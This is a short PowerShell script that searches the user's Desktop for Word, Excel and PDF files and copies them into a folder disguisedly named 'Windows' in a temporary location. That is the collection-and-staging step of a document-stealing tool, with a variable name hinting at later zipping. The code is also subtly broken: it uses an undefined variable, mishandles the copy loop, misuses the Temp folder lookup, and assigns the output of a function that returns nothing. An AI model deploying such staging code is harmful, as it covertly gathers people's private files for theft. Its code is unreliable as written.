  function Scan-Files {
    param (
        [string]$Path,
        [string[]]$Extensions
    )

    # Validate path
    if (!(Test-Path $Path)) {
        Write-Host "Error: $Path does not exist" -ForegroundColor Red
        return $null
    }

    # Scan files based on extensions
    $files = Get-ChildItem -Path $Path -Recurse -File -Include $Extensions
    if ($files.Count -eq 0) {
        Write-Host "Warning: No file match" -ForegroundColor Yellow
        return $null
    }
    else {
        foreach ($file in $files) { 
        Write-Host "Info: Found $file " -ForegroundColor Green
        }
    }

    return $files
}

function Collect-Files {
    param (
        [string]$destinationPath,
        [string]$fileName,
        [Array[]]$files
    )

    # Validate path
    if (!(Test-Path $destinationPath)) {
        Write-Host "Error: Path does not exist" -ForegroundColor Red
        return $null
    }

    # Temporary file path
    $tempFolderPath = "$destinationPath\$fileName"

    # Create a temporary folder to store files
    New-Item -ItemType Directory -Force -Path $tempFolderPath | Out-Null


    # Copy files to the temporary folder
    $filesToArchive | ForEach-Object {
        Copy-Item -Path $files.FullName -Destination $tempFolderPath
    }
    Write-Host "Info: Copied to $tempFolderPath" -ForegroundColor Green

}

# File Scanning
Write-Host "File Scanning....." -ForegroundColor Blue
# Add extention as per requirement
$fileExtensions = "*.doc", "*.docx", "*.xls", "*.xlsx", "*.pdf"
$scanPath = [System.Environment]::GetFolderPath('Desktop')
$scannedFiles = Scan-Files -Path $scanPath -Extensions $fileExtensions

# File Collecting
Write-Host "File Collecting....." -ForegroundColor Blue
$destinationPath = [System.Environment]::GetFolderPath('Temp')
$collectedFiles = "Windows"
$zipFilePath = Collect-Files -destinationPath $destinationPath -fileName $collectedFiles -files $scannedFiles